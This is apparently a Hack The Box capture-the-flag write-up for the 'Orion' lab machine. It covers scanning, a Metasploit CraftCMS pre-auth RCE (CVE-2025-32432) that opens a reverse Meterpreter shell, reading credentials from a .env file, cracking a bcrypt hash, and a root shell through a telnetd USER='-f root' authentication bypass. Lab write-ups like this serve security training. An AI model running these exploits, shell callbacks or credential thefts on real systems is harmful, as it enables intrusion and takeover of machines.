# **HTB: Orion - Complete Penetration Testing Writeup**

Here is the complete, detailed writeup based on the attack chain for the Orion machine. This document explains the methodology, step-by-step actions, and the detailed meaning of commands used during the exploitation process.

### **Summary of Attack Chain**
Orion is a Very-Easy Linux machine that features CSRF Validation Bypass and exploration of CraftCMS and Telnetd. We chain multiple vulnerabilities to gain full control:
1. **Information Disclosure & CSRF Bypass:** Enumerate an exposed `/admin` endpoint to find CraftCMS version 5.6.16. Bypass CSRF protections by capturing `CraftSessionId`, `CRAFT_CSRF_TOKEN`, and `csrfTokenValue`.
2. **Pre-Auth RCE (CVE-2025-32432):** Exploit a Yii deserialization gadget chain via the `generate-transform` endpoint to instantiate arbitrary classes and gain a shell as `www-data`.
3. **Lateral Movement:** Extract database credentials from the CraftCMS `.env` file, dump the `users` table via MySQL, and crack the admin's bcrypt hash (`darkangel`) to SSH into the machine as `adam`.
4. **Privilege Escalation:** Discover a local `telnetd` service (GNU inetutils 2.7) vulnerable to CVE-2026-24061. Bypass authentication by manipulating the `USER` environment variable (`-f root`) to get root access.


---

## **Phase 1: Reconnaissance & Enumeration**

We start by mapping the external attack surface of the target machine.

### **1. Port Scanning & Fingerprinting**
We run a targeted service scan using Nmap.

* **Command:** `nmap -sCV 10.129.231.23`
  * *Result:* SSH (OpenSSH 8.9p1) on Port 22, and HTTP (nginx 1.18.0) on Port 80 redirecting to `http://orion.htb/`.

### **2. Virtual Host & Application Discovery**
We add `orion.htb` to our `/etc/hosts` file and enumerate directories.

* **Host Mapping:** `echo "10.129.231.23 orion.htb" | sudo tee -a /etc/hosts`
* **Directory Fuzzing Command:** `ffuf -u http://orion.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic`
  * *Result:* Discovered `/admin` which redirects to `/admin/login`.

Visiting the `/admin/login` page reveals the portal is powered by **Craft CMS 5.6.16** at the bottom of the page.


---

## **Phase 2: CSRF Bypass & Pre-Auth RCE (Foothold)**

CraftCMS 5.6.16 is vulnerable to **CVE-2025-32432**, an unauthenticated remote code execution flaw in the image transformation function.

### **3. Bypassing CSRF Validation**
To interact with the vulnerable endpoint, we must bypass CSRF verification by fetching a valid session and token from the login page.

* **Tokens Extracted:**
  * `CraftSessionId`: identifies the session.
  * `CRAFT_CSRF_TOKEN`: server's stored CSRF reference cookie.
  * `csrfTokenValue`: The actual CSRF token needed for AJAX requests, found embedded in the login page's JSON configuration.

### **4. Exploiting CVE-2025-32432**
We use Metasploit to automate the exploit chain. The module abuses the `actions/assets/generate-transform` endpoint. It parses JSON containing a `class` key as object creation instructions (Yii deserialization), instantiating `GuzzleHttp\Psr7\FnStream` to run a web shell injected into the PHP session file.

* **Exploitation Commands:**
```bash
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set rhosts orion.htb
set rport 80
set lhost <YOUR_IP>
exploit
```
  * *Result:* Meterpreter session opened as `www-data`. We drop into a shell and upgrade it using `script /dev/null -c /bin/bash`.


---

## **Phase 3: Lateral Movement**

As `www-data`, we enumerate the local filesystem and target the CraftCMS application files.

### **5. Extracting Database Credentials**
We check the `~/html/craft/` directory and read the `.env` file.
* **Command:** `cat .env`
* **Result:** Discovered MySQL credentials: `root` / `SuperSecureCraft123Pass!`

### **6. Dumping Hashes & Cracking**
We log into the local MySQL instance and dump the `users` table.
* **Command:** `mysql -u root -p orion`
* **Query:** `SELECT * FROM users;`
* **Result:** Found a bcrypt hash for `adam@orion.htb` (`$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxob00GMbXo8NHp3P/B42LUg0lS`).

We use Hashcat to crack the bcrypt hash using the `rockyou.txt` wordlist.
* **Command:** `hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`
* **Result:** Hash cracked to password: `darkangel`.

We reuse this password to authenticate via SSH as the user `adam`.


In [ ]:
# Reading the User Flag via SSH
import os
os.system('ssh adam@orion.htb "cat user.txt"')

---

## **Phase 4: Privilege Escalation (`root`)**

Now authenticated as `adam`, we look for internal services to escalate privileges.

### **7. Enumerating Local Services**
We check for listening ports not exposed externally.
* **Command:** `netstat -tulnp`
* **Result:** Discovered Port 23 (`telnet`) listening on `127.0.0.1`.

We check the version of the telnet daemon.
* **Command:** `telnet --version`
* **Result:** `telnet (GNU inetutils) 2.7`

### **8. Telnetd Authentication Bypass (CVE-2026-24061)**
This version of `telnetd` is vulnerable to a remote authentication bypass. By setting the `USER` environment variable, we trick the daemon into passing it to `login(1)` as an argument. Passing `-f root` executes `login -f root`, which forces a login as the root user while skipping authentication entirely.


In [ ]:
# PrivEsc Payload executed on the compromised machine as 'adam'
import os
os.system('USER="-f root" telnet -a 127.0.0.1')

In [ ]:
# Retrieving the Root Flag
import os
os.system('cat /root/root.txt')